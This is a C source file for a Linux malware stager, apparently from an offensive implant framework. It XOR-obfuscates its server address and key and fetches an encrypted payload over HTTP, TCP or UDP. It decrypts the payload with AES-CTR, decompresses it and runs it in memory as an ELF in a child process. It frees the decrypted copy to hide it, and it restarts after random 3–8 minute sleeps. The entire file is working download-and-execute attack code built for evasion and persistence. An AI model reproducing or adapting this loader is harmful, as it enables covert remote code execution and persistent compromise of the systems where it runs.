#define _GNU_SOURCE
#include "aes.h"
#include "elf_loader.h"
#include "tinf.h"
#include "utils.h"

/* Configurable Options - XOR-encoded byte arrays to hide strings */
#ifndef ENCODED_HOST
#define ENCODED_HOST 0x00
#endif
#ifndef ENCODED_PORT
#define ENCODED_PORT 0x00
#endif
#ifndef ENCODED_PATH
#define ENCODED_PATH 0x00
#endif
#ifndef ENCODED_KEY
#define ENCODED_KEY 0x00
#endif

// Random XOR key generated per build
#ifndef CONFIG_XOR_KEY
#define CONFIG_XOR_KEY 0x5A
#endif

#define BUFFER_SIZE 65536

#ifdef DEBUG
#define DEBUG_PRINT(fmt, args...) debug_print("DEBUG: " fmt, ##args)
#define DEBUG_PERROR(msg) perror(msg)
#else
#define DEBUG_PRINT(fmt, args...) // Do nothing in release builds
#define DEBUG_PERROR(msg)         // Do nothing in release builds
#endif

// XOR-encoded configuration arrays
static const unsigned char encoded_host[] = {ENCODED_HOST};
static const unsigned char encoded_port[] = {ENCODED_PORT};
static const unsigned char encoded_path[] = {ENCODED_PATH};
static const unsigned char encoded_key[] = {ENCODED_KEY};

// Forward declarations
static void decode_config_string(char *dest, const unsigned char *encoded,
                                 size_t max_len);
void derive_key_from_string(const char *str, uint8_t *key);
size_t download_file(const char *host, const char *port, const char *path,
                     const uint8_t *key, char **buffer);
static int build_payload_from_encrypted(char *enc_buf, size_t enc_size,
                                        const uint8_t *key, char **out_buf,
                                        size_t *out_size);

static volatile int g_trap_requested = 0;

static void sigtrap_handler(int signo) {
  (void)signo;
  g_trap_requested = 1;
}

void stager_main(long *sp);

__asm__(".text\n"
        ".global _start\n"
        "_start:\n"
        "xor %rbp, %rbp\n"
        "mov %rsp, %rdi\n"                // Pass stack pointer as argument
        "and $0xfffffffffffffff0, %rsp\n" // Align stack to 16 bytes
        "call stager_main\n"
        "mov $60, %rax\n" // sys_exit
        "xor %rdi, %rdi\n"
        "syscall\n");

void stager_main(long *sp) {
  long argc = *sp;
  char **argv = (char **)(sp + 1);
  char **envp = argv + argc + 1;

  char host[256];
  char port[16];
  char path[256];
  char key_str[256];
  uint8_t key[16];

  decode_config_string(host, encoded_host, sizeof(host));
  decode_config_string(port, encoded_port, sizeof(port));
  decode_config_string(path, encoded_path, sizeof(path));
  decode_config_string(key_str, encoded_key, sizeof(key_str));

  derive_key_from_string(key_str, key);

  // Setup signal handler for SIGTRAP
  struct sigaction trap_sa;
  memset(&trap_sa, 0, sizeof(trap_sa));
  trap_sa.sa_handler = sigtrap_handler;
  sigemptyset(&trap_sa.sa_mask);
  sigaction(SIGTRAP, &trap_sa, NULL);

  char *payload = NULL;

  DEBUG_PRINT("Starting stager...\n");
  DEBUG_PRINT("Host: %s, Port: %s, Path: %s\n", host, port, path);

  // Try to download
  size_t downloaded_size = download_file(host, port, path, key, &payload);
  DEBUG_PRINT("Downloaded %d bytes\n", (int)downloaded_size);

  if (downloaded_size > 0) {
    while (1) {
      g_trap_requested = 0;

      char *final_payload = NULL;
      size_t final_size = 0;
      if (build_payload_from_encrypted(payload, downloaded_size, key,
                                       &final_payload, &final_size) == 0) {
        DEBUG_PRINT("Payload built successfully, size: %d\n", (int)final_size);
        // Run it
        long pid = fork();
        if (pid == 0) {
          // Child process
          elf_run(final_payload, argv, envp);
          exit(0);
        } else if (pid > 0) {
          // Parent process
          // Free the decrypted payload to hide it from memory
          free(final_payload);

          // Wait for child to exit
          int status = 0;
          while (1) {
            long res = waitpid((int)pid, &status, WNOHANG);
            if (res == pid) {
              DEBUG_PRINT("Child exited with status %d\n", status);
              break;
            }

            if (g_trap_requested) {
              DEBUG_PRINT("Indicator offline trap received, killing child %d\n",
                          (int)pid);
              kill((int)pid, SIGKILL);
              waitpid((int)pid, &status, 0);
              break;
            }

            struct timespec req;
            req.tv_sec = 1;
            req.tv_nsec = 0;
            nanosleep(&req, NULL);
          }

          // Sleep for a random time (3-8 minutes)
          unsigned int sleep_s = 0;
          getrandom(&sleep_s, sizeof(sleep_s), 0);
          sleep_s = 180 + (sleep_s % 300);

          DEBUG_PRINT("Sleeping %d seconds before restart\n", sleep_s);
          struct timespec req;
          req.tv_sec = sleep_s;
          req.tv_nsec = 0;
          nanosleep(&req, NULL);
        } else {
          DEBUG_PRINT("Fork failed\n");
          free(final_payload);
          break;
        }
      } else {
        DEBUG_PRINT("Failed to build payload\n");
        break;
      }
    }
  } else {
    DEBUG_PRINT("Download failed\n");
  }

  exit(0);
}

// Decode XOR-obfuscated config string at runtime
static void decode_config_string(char *dest, const unsigned char *encoded,
                                 size_t max_len) {
  size_t i = 0;
  while (i < max_len - 1) {
    if (encoded[i] == 0x00)
      break;
    dest[i] = encoded[i] ^ CONFIG_XOR_KEY;
    i++;
  }
  dest[i] = '\0';
}

// forward declarations
size_t decrypt_data(char *data, size_t data_size, const uint8_t *key,
                    const uint8_t *iv);

// build a runnable payload by decrypting and decompressing the stored blob
static int build_payload_from_encrypted(char *enc_buf, size_t enc_size,
                                        const uint8_t *key, char **out_buf,
                                        size_t *out_size) {
  DEBUG_PRINT("build_payload_from_encrypted: enc_size=%d\n", (int)enc_size);
  if (!enc_buf || enc_size <= 16 || !out_buf || !out_size) {
    DEBUG_PRINT("Invalid arguments or size too small\n");
    return -1;
  }

  uint8_t iv[16];
  memcpy(iv, enc_buf, 16);
  size_t encrypted_body = enc_size - 16;

  // Decrypt in-place to save memory
  char *cipher = enc_buf + 16;
  decrypt_data(cipher, encrypted_body, key, iv);
  DEBUG_PRINT("Decrypted data, size=%d\n", (int)encrypted_body);

  unsigned int capacity = (unsigned int)encrypted_body * 10;
  char *decomp = NULL;
  int res = TINF_OK;
  unsigned int out_len = 0;

  for (int attempt = 0; attempt < 3; attempt++) {
    DEBUG_PRINT("Decompression attempt %d, capacity=%d\n", attempt, capacity);
    decomp = calloc(capacity, sizeof(char));
    if (!decomp) {
      DEBUG_PRINT("Failed to allocate decompression buffer\n");
      return -1;
    }

    out_len = capacity;
    res = tinf_uncompress(decomp, &out_len, cipher, encrypted_body);
    DEBUG_PRINT("tinf_uncompress result: %d, out_len: %d\n", res, out_len);
    if (res == TINF_OK)
      break;

    free(decomp);
    decomp = NULL;
    capacity *= 2; // try a larger buffer
  }

  if (res != TINF_OK || !decomp) {
    DEBUG_PRINT("Decompression failed\n");
    return -1;
  }

  *out_buf = decomp;
  *out_size = out_len;
  return 0;
}

/**
 * Decrypts data using the AES-128-CTR algorithm.
 */
size_t decrypt_data(char *data, size_t data_size, const uint8_t *key,
                    const uint8_t *iv) {
  struct AES_ctx ctx;
  AES_init_ctx_iv(&ctx, key, iv);
  AES_CTR_xcrypt_buffer(&ctx, (uint8_t *)data, data_size);
  return data_size;
}

/**
 * Derives a key from a string.
 */
void derive_key_from_string(const char *str, uint8_t *key) {
  uint32_t temp_key[4] = {0};
  size_t len = strlen(str);
  for (int i = 0; i < 4; i++) {
    for (size_t j = 0; j < len / 4; j++) {
      temp_key[i] ^= ((uint32_t)str[i + j * 4]) << (j % 4 * 8);
    }
  }
  memcpy(key, temp_key, 16);
}

/**
 * Downloads a file from a specified host and port using different protocols,
 * and decrypts and decompresses it using the provided key.
 */
size_t download_file(const char *host, const char *port, const char *path,
                     const uint8_t *key, char **buffer) {
  (void)key; // Suppress unused warning if UDP is disabled
  int sockfd;
  struct sockaddr_in serv_addr;
  char *temp_buffer = malloc(BUFFER_SIZE);
  if (!temp_buffer) {
    return 0;
  }
  size_t data_size = 0;

  // Prepare the address info
  memset(&serv_addr, 0, sizeof(serv_addr));
  serv_addr.sin_family = AF_INET;

  // Parse port
  int port_num = 0;
  const char *p = port;
  while (*p) {
    port_num = port_num * 10 + (*p - '0');
    p++;
  }
  serv_addr.sin_port = htons(port_num);

  // Parse IP
  if (inet_aton(host, &serv_addr.sin_addr) == 0) {
    // Failed to parse IP. DNS resolution not implemented in shellcode stager.
    free(temp_buffer);
    return 0;
  }

  // Create the socket
#ifdef LISTENER_UDP
  sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
#else
  sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
#endif

  if (sockfd == -1) {
    free(temp_buffer);
    return 0;
  }

#ifndef LISTENER_UDP
  // Connect to the server (TCP only)
  if (connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) == -1) {
    close(sockfd);
    free(temp_buffer);
    return 0;
  }
#endif

#ifdef LISTENER_HTTP
  // HTTP protocol - send GET request
  char request[BUFFER_SIZE];
  char *ptr = request;

  // "GET "
  memcpy(ptr, "GET ", 4);
  ptr += 4;

  // path
  size_t len = strlen(path);
  memcpy(ptr, path, len);
  ptr += len;

  // " HTTP/1.1\r\nHost: "
  const char *mid = " HTTP/1.1\r\nHost: ";
  size_t mid_len = 17; // strlen(mid)
  memcpy(ptr, mid, mid_len);
  ptr += mid_len;

  // host
  len = strlen(host);
  memcpy(ptr, host, len);
  ptr += len;

  // "\r\nConnection: close\r\n\r\n"
  const char *end = "\r\nConnection: close\r\n\r\n";
  size_t end_len = 23; // strlen(end)
  memcpy(ptr, end, end_len);
  ptr += end_len;

  *ptr = '\0';

  if (send(sockfd, request, strlen(request), 0) == -1) {
    close(sockfd);
    free(temp_buffer);
    return 0;
  }

  // Read the response and skip HTTP headers
  int header_end = 0;
  while (1) {
    long bytes_received = recv(sockfd, temp_buffer, BUFFER_SIZE - 1, 0);
    if (bytes_received <= 0) {
      break;
    }
    temp_buffer[bytes_received] = '\0';

    if (!header_end) {
      char *header_end_ptr = strstr(temp_buffer, "\r\n\r\n");
      if (header_end_ptr) {
        header_end = 1;
        size_t header_length = header_end_ptr - temp_buffer + 4;
        char *new_buf =
            realloc(*buffer, data_size + bytes_received - header_length);
        if (!new_buf)
          break;
        *buffer = new_buf;
        memcpy(*buffer + data_size, temp_buffer + header_length,
               bytes_received - header_length);
        data_size += bytes_received - header_length;
      }
    } else {
      char *new_buf = realloc(*buffer, data_size + bytes_received);
      if (!new_buf)
        break;
      *buffer = new_buf;
      memcpy(*buffer + data_size, temp_buffer, bytes_received);
      data_size += bytes_received;
    }
  }
#elif defined(LISTENER_TCP)
  // Raw TCP - read data directly
  while (1) {
    long bytes_received = recv(sockfd, temp_buffer, BUFFER_SIZE, 0);
    if (bytes_received <= 0) {
      break;
    }
    char *new_buf = realloc(*buffer, data_size + bytes_received);
    if (!new_buf)
      break;
    *buffer = new_buf;
    memcpy(*buffer + data_size, temp_buffer, bytes_received);
    data_size += bytes_received;
  }
#elif defined(LISTENER_UDP)
  // UDP - receive datagrams
  struct sockaddr_in src_addr;
  unsigned int src_len = sizeof(src_addr);

  // Set timeout for recvfrom
  struct timeval tv;
  tv.tv_sec = 1;
  tv.tv_usec = 0;
  setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, (const char *)&tv, sizeof tv);

  // Send key hash as authentication request (Hello Packet)
  uint32_t key_hash = 0;
  for (int i = 0; i < 16; i++) {
    key_hash ^= ((uint32_t)key[i]) << ((i % 4) * 8);
  }

  char hello_packet[5];
  hello_packet[0] = 0x02;
  memcpy(hello_packet + 1, &key_hash, 4);

  uint32_t expected_seq = 0;
  int hello_retries = 0;

  // Receive data in chunks
  while (1) {
    // Send Hello if we haven't received any data yet
    if (expected_seq == 0) {
      if (sendto(sockfd, hello_packet, 5, 0, (struct sockaddr *)&serv_addr,
                 sizeof(serv_addr)) == -1) {
        close(sockfd);
        free(temp_buffer);
        return 0;
      }
    }

    long bytes_received = recvfrom(sockfd, temp_buffer, BUFFER_SIZE, 0,
                                   (struct sockaddr *)&src_addr, &src_len);

    if (bytes_received <= 0) {
      // Timeout or error
      if (expected_seq == 0) {
        hello_retries++;
        if (hello_retries > 20) {
          break;
        }
        continue;
      } else {
        // We were receiving data but stopped?
        // Maybe finished?
        break;
      }
    }

    // Check if it's a data packet
    if (bytes_received > 4) {
      uint32_t seq = 0;
      memcpy(&seq, temp_buffer, 4);
      if (seq == expected_seq) {
        char *new_buf = realloc(*buffer, data_size + bytes_received - 4);
        if (!new_buf)
          break;
        *buffer = new_buf;
        memcpy(*buffer + data_size, temp_buffer + 4, bytes_received - 4);
        data_size += bytes_received - 4;
        expected_seq++;

        // Send ACK
        sendto(sockfd, &seq, 4, 0, (struct sockaddr *)&src_addr, src_len);
      } else if (seq < expected_seq) {
        // Re-send ACK for old packet
        sendto(sockfd, &seq, 4, 0, (struct sockaddr *)&src_addr, src_len);
      }
    }
  }
#endif

  close(sockfd);
  free(temp_buffer);
  return data_size;
}
